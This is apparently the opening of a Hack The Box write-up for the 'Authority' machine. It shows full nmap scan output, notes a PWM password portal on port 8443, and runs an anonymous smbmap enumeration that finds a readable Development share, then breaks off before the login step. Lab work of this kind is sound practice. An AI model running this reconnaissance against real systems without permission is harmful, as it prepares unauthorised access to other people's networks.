### Recon:

```
PORT STATE SERVICE REASON VERSION

53/tcp open domain syn-ack Simple DNS Plus
80/tcp open http syn-ack Microsoft IIS httpd 10.0
| http-methods:
| Supported Methods: OPTIONS TRACE GET HEAD POST
|_ Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-10-25 17:56:59Z)
135/tcp open msrpc syn-ack Microsoft Windows RPC
139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after: 2024-08-09T23:13:21
| MD5: d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2023-10-25T17:59:47+00:00; +3h59m59s from scanner time.
445/tcp open microsoft-ds? syn-ack
464/tcp open kpasswd5? syn-ack
593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after: 2024-08-09T23:13:21
| MD5: d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-10-25T17:59:48+00:00; +3h59m58s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after: 2024-08-09T23:13:21
| MD5: d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
3269/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after: 2024-08-09T23:13:21
| MD5: d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDETMBEGCgmSJomT8ixkARkWA2h0YjEZ
| MBcGA1UEAxMQaHRiLUFVVEhPUklUWS1DQTAeFw0yMjA4MDkyMzAzMjFaFw0yNDA4
| MDkyMzEzMjFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVsJL0
| ae0n8L0Eg5BAHi8Tmzmbe+kIsXM6NZvAuqGgUsWNzsT4JNWsZqrRoHMr+kMC4kpX
| 4QuOHTe74iyB8TvucgvwxKEi9uZl6C5unv3WNFhZ9KoTOCno26adxqKPbzS5KQtk
| ZCvQfqQKOML0DuzA86kwh4uY0SjVR+biRj4IkkokWrPDWzzow0gCpO5HNcKPhSTl
| kAfdmdQRPjkXQq3h2QnfYAwOMGoGeCiA1whIo/dvFB6T9Kx4Vdcwi6Hkg4CwmbSF
| CHGbeNGtMGeWw/s24QWZ6Ju3J7uKFxDXoWBNLi4THL72d18jcb+i4jYlQQ9bxMfI
| zWQRur1QXvavmIM5AgMBAAGjggLxMIIC7TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEE
| AYI3FQiEsb4Mh6XAaYK5iwiG1alHgZTHDoF+hKv0ccfMXgIBZAIBAjAyBgNVHSUE
| KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
| AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBTE4oKGc3Jv
| tctii3A/pyevpIBM/TAfBgNVHSMEGDAWgBQrzmT6FcxmkoQ8Un+iPuEpCYYPfTCB
| zQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDovLy9DTj1odGItQVVUSE9SSVRZ
| LUNBLENOPWF1dGhvcml0eSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
| ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1odGIsREM9Y29ycD9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaB
| n2xkYXA6Ly8vQ049aHRiLUFVVEhPUklUWS1DQSxDTj1BSUEsQ049UHVibGljJTIw
| S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1o
| dGIsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
| aWNhdGlvbkF1dGhvcml0eTBUBgNVHREBAf8ESjBIoCMGCisGAQQBgjcUAgOgFQwT
| QVVUSE9SSVRZJEBodGIuY29ycIISYXV0aG9yaXR5Lmh0Yi5jb3JwgghodGIuY29y
| cIIDSFRCMA0GCSqGSIb3DQEBCwUAA4IBAQCH8O6l8pRsA/pyKKsSSkie8ijDhCBo
| zoOuHiloC694xvs41w/Yvj9Z0oLiIkroSFPUPTDZOFqOLuFSDbnDNtKamzfbSfJR
| r4rj3F3r7S3wwK38ElkoD8RbqDiCHan+2bSf7olB1AdS+xhp9IZvBWZOlT0xXjr5
| ptIZERSRTRE8qyeX7+I4hpvGTBjhvdb5LOnG7spc7F7UHk79Z+C3BWG19tyS4fw7
| /9jm2pW0Maj1YEnX7frbYtYlO7iQ3KeDw1PSCMhMlipovbCpMJ1YOX9yeQgvvcg0
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
8443/tcp open ssl/https-alt syn-ack
| http-methods:
|_ Supported Methods: GET HEAD
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings:
| FourOhFourRequest:
| HTTP/1.1 200
| Content-Type: text/html;charset=ISO-8859-1
| Content-Length: 82
| Date: Wed, 25 Oct 2023 17:57:19 GMT
| Connection: close
| <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
| GetRequest:
| HTTP/1.1 200
| Content-Type: text/html;charset=ISO-8859-1
| Content-Length: 82
| Date: Wed, 25 Oct 2023 17:57:06 GMT
| Connection: close
| <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
| HTTPOptions:
| HTTP/1.1 200
| Allow: GET, HEAD, POST, OPTIONS
| Content-Length: 0
| Date: Wed, 25 Oct 2023 17:57:12 GMT
| Connection: close
| RTSPRequest:
| HTTP/1.1 400
| Content-Type: text/html;charset=utf-8
| Content-Language: en
| Content-Length: 1936
| Date: Wed, 25 Oct 2023 17:57:29 GMT
| Connection: close
| <!doctype html><html lang="en"><head><title>HTTP Status 400
| Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_ Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-23T16:53:27
| Not valid after: 2025-10-25T04:31:51
| MD5: d97b:05e0:c27a:2bc4:c303:a894:dabc:9217
| SHA-1: 5945:e7b4:d743:f9c7:b405:cdc5:0e47:7427:48a7:b003
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIGEmZnD69PMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNVBAMM
| DDE3Mi4xNi4yLjExODAeFw0yMzEwMjMxNjUzMjdaFw0yNTEwMjUwNDMxNTFaMBcx
| FTATBgNVBAMMDDE3Mi4xNi4yLjExODCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAMRF96iRnlDRxkErDwZMLU9bBxN3bSmWyhRnn2kBWUqYjphc11JDOIcl
| 9Ag10qRgh4EZP1072/BB3j0X0/KjTxh2YfVElSet8oVrrwXzTmTyzlku4te8LD/o
| Yq7WJbFuWr7w87g11h6q4UNRG3hbpZxdpUUlVjljxcU3OrU3QqE6egXbD2Fy/akb
| zDC6uVKNaLF85iF5RgXHxfEE6rzkmYtk/jlVjILaaIUqbBlnqBGXubyazFNvWugU
| 5zUShfwpOfQYjn0zft4jXLo1XxlOENvfEQ9WK3L90CDcxFOiw8HxvJpwHGpPXwiZ
| QVjeuQBh6sAvxGs6CgdwLQWR7dTDq1cCAwEAAaM4MDYwDAYDVR0TAQH/BAIwADAO
| BgNVHQ8BAf8EBAMCBaAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwEwDQYJKoZIhvcN
| AQELBQADggEBAJpcHnkbkVnWZhwzc7BtIQxiZgAZUMVG0wkAGOK1ibV2mFAxti8Z
| vtdfyoG2+TJNXMsuuZq3g6Xs+RkFbTBVj4SB29BhlMEL/bOvDIc14tsc9LTfC0P0
| 2Yuo33JCRWKyAyV3JptAM9R88gpyEPgoVU2sEC5IukoX/nrsUGni0BtJWsPrJ9L9
| Wspj56FVAUVB98O3ssFKE/bKR2uXVbmV/RDqAWdmBp+prXv1w4wbG7892122VbA+
| O8FhdTb4XehpvftUqF1i8EtaBICxmt8jt8olvG8pJRDiAuDgbdCF69wRY/9Ceyg4
| CI8ocCH6o7ZZzzFEaIQZszdmqLT0OosAPF0=
|_-----END CERTIFICATE-----
9389/tcp open mc-nmf syn-ack .NET Message Framing
47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open msrpc syn-ack Microsoft Windows RPC
49665/tcp open msrpc syn-ack Microsoft Windows RPC
49666/tcp open msrpc syn-ack Microsoft Windows RPC
49668/tcp open msrpc syn-ack Microsoft Windows RPC
49675/tcp open msrpc syn-ack Microsoft Windows RPC
49691/tcp open msrpc syn-ack Microsoft Windows RPC
49693/tcp open msrpc syn-ack Microsoft Windows RPC
49694/tcp open msrpc syn-ack Microsoft Windows RPC
49703/tcp open msrpc syn-ack Microsoft Windows RPC
49705/tcp open msrpc syn-ack Microsoft Windows RPC
49717/tcp open msrpc syn-ack Microsoft Windows RPC
56740/tcp open msrpc syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=10/25%Time=65391EB3%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;
SF:charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,\x2025\x20O
SF:ct\x202023\x2017:57:06\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n
SF:<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"
SF:/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20
SF:GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20W
SF:ed,\x2025\x20Oct\x202023\x2017:57:12\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x2
SF:0text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,
SF:\x2025\x20Oct\x202023\x2017:57:19\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;U
SF:RL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r
SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r
SF:\nContent-Length:\x201936\r\nDate:\x20Wed,\x2025\x20Oct\x202023\x2017:5
SF:7:29\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20R
SF:eport</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20th
SF:e\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p>
SF:<b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20p
SF:rocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20per
SF:ceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x2
SF:0request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
| p2p-conficker:
| Checking for Conficker.C or higher...
| Check 1 (port 64473/tcp): CLEAN (Couldn't connect)
| Check 2 (port 33078/tcp): CLEAN (Couldn't connect)
| Check 3 (port 45856/udp): CLEAN (Failed to receive data)
| Check 4 (port 63645/udp): CLEAN (Timeout)
|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
| date: 2023-10-25T17:59:12
|_ start_date: N/A
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:59
Completed NSE at 09:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:59
Completed NSE at 09:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:59
Completed NSE at 09:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 250.17 secondS
```




The most important thing on this machine starts here, on this site
https://10.10.11.222:8443

Here is working a pwn site, that is an open source  self-service password app that is designed to work together with LDAP
[https://github.com/pwm-project/pwm](https://github.com/pwm-project/pwm)

We have a login panel with two inputs , user and password, and if we click on manager configuration we have the possibility to log in only with a password, but we have no credentials


I tried many things to retrieve info, but I will put only the specific things to PWN the machine

I used smbmap without credentials  to see if I was able to read something:

```
smbmap -H 10.10.11.222 -u anonymous

[+] IP: 10.10.11.222:445 Name: 10.10.11.222 Status: Authenticated

Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
C$ NO ACCESS Default share
Department Shares NO ACCESS
Development READ ONLY
IPC$ READ ONLY Remote IPC
NETLOGON NO ACCESS Logon server share
SYSVOL NO ACCESS Logon
```

Then I logged into the machine with:

